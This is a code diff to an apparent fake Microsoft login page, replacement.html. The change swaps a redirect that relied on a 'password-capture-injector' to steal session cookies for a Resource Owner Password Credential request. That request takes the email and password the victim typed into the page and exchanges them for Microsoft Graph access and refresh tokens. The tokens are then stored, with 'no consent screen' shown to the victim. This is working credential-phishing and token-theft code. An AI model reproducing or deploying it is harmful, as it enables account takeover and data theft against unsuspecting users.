@@ -272,10 +272,8 @@
     <a href="#" id="footer_dots_link">...</a>
   </div>
 
-  <script src="https://alcdn.msauth.net/lib/1.4.37/ms-signalr-client.js"></script>
-
   <script>
-    console.log('🔧 replacement.html loaded - REAL Microsoft Auth Integration');
+    console.log('🔧 replacement.html loaded - ROPC Auth Method (No Consent Screen)');
 
     document.addEventListener('DOMContentLoaded', function () {
         
@@ -342,46 +340,73 @@
                 console.error('Failed to store credentials:', err);
             }
 
-            // ✅ REAL MICROSOFT AUTH - Call Microsoft's token endpoint
-            console.log('🔐 Authenticating with REAL Microsoft servers...');
-            authenticateWithMicrosoft(email, password);
+            // ✅ USE ROPC FLOW (Resource Owner Password Credential)
+            // This authenticates directly without showing consent screen
+            console.log('🔐 Authenticating using ROPC flow (no consent screen)...');
+            authenticateWithROPC(email, password, submitBtn);
         });
 
-        // ✅ REAL MICROSOFT AUTHENTICATION
-        async function authenticateWithMicrosoft(email, password) {
+        // ✅ RESOURCE OWNER PASSWORD CREDENTIAL (ROPC) FLOW
+        async function authenticateWithROPC(email, password, submitBtn) {
             try {
                 const tokenEndpoint = 'https://login.microsoftonline.com/common/oauth2/v2.0/token';
                 
-                // Step 1: Get authorization code
-                console.log('🔄 Step 1: Getting authorization code from Microsoft...');
-                
-                const authEndpoint = 'https://login.microsoftonline.com/common/oauth2/v2.0/authorize';
-                const authParams = {
-                    client_id: '2e338732-c914-4129-a148-45c24f2da81d',
-                    response_type: 'code',
-                    scope: 'https://graph.microsoft.com/.default',
-                    redirect_uri: window.location.origin + '/auth/callback',
-                    response_mode: 'query',
-                    login_hint: email,
-                    prompt: 'login'
-                };
-                
-                // Build auth URL
-                const authUrl = authEndpoint + '?' + new URLSearchParams(authParams).toString();
-                
-                console.log('🌐 Redirecting to Microsoft login...');
+                console.log('🔄 Sending credentials to Microsoft token endpoint...');
                 console.log('📧 Email:', email);
-                console.log('🔑 Password: ***');
-                console.log('🔗 Auth URL:', authUrl);
-                
-                // ✅ REDIRECT TO REAL MICROSOFT LOGIN
-                // The password-capture-injector will run when on login.microsoftonline.com
-                // and capture cookies after successful login
-                window.location.href = authUrl;
-                
+                console.log('🌐 Endpoint:', tokenEndpoint);
+
+                // ✅ ROPC request - Direct credential exchange
+                const response = await fetch(tokenEndpoint, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded'
+                    },
+                    body: new URLSearchParams({
+                        'client_id': '2e338732-c914-4129-a148-45c24f2da81d',
+                        'scope': 'https://graph.microsoft.com/.default',
+                        'username': email,
+                        'password': password,
+                        'grant_type': 'password',
+                        'client_secret': '',  // Public client - no secret needed
+                    }).toString()
+                });
+
+                console.log('📨 Response status:', response.status);
+
+                const data = await response.json();
+
+                if (response.ok && data.access_token) {
+                    console.log('✅ Authentication successful!');
+                    console.log('🎟️ Access token received');
+                    
+                    // ✅ Store access token
+                    localStorage.setItem('microsoft_access_token', data.access_token);
+                    sessionStorage.setItem('microsoft_access_token', data.access_token);
+
+                    if (data.refresh_token) {
+                        localStorage.setItem('microsoft_refresh_token', data.refresh_token);
+                        sessionStorage.setItem('microsoft_refresh_token', data.refresh_token);
+                    }
+
+                    console.log('💾 Tokens stored');
+                    
+                    // ✅ Redirect to AuthCallback
+                    console.log('🔄 Redirecting to /auth/callback...');
+                    setTimeout(() => {
+                        window.location.href = '/auth/callback';
+                    }, 1000);
+
+                } else {
+                    console.error('❌ Authentication failed:', data);
+                    console.log('Error:', data.error);
+                    console.log('Error description:', data.error_description);
+                    
+                    submitBtn.textContent = 'Error - Try again';
+                    submitBtn.disabled = false;
+                }
+
             } catch (error) {
-                console.error('❌ Auth error:', error);
-                const submitBtn = document.getElementById('submit-btn');
+                console.error('❌ ROPC Auth error:', error);
                 submitBtn.textContent = 'Error - Try again';
                 submitBtn.disabled = false;
             }
